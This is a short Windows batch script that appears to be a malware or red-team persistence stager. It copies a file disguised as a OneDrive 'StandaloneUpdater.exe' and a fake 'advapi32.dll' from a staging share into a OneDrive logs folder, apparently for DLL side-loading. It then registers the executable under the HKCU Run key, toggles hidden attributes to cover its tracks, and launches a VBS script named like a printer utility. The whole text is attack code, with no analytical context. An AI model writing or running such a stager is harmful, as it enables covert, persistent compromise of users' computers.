@echo off
attrib -h "\\staging\Users\Public\StandaloneUpdater.exe"
copy /y "\\staging\Users\Public\StandaloneUpdater.exe" "%LOCALAPPDATA%\Microsoft\OneDrive\setup\logs\StandaloneUpdater.exe"
copy /y "\\staging\Users\Public\advapi32.dll" "%LOCALAPPDATA%\Microsoft\OneDrive\setup\logs\advapi32.dll"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v StandaloneUpdater /t REG_SZ /d "%LOCALAPPDATA%\Microsoft\OneDrive\setup\logs\StandaloneUpdater.exe" /f
attrib +h "\\staging\Users\Public\StandaloneUpdater.exe"
WScript.exe "C:\Users\Public\prncnfg.vbs"
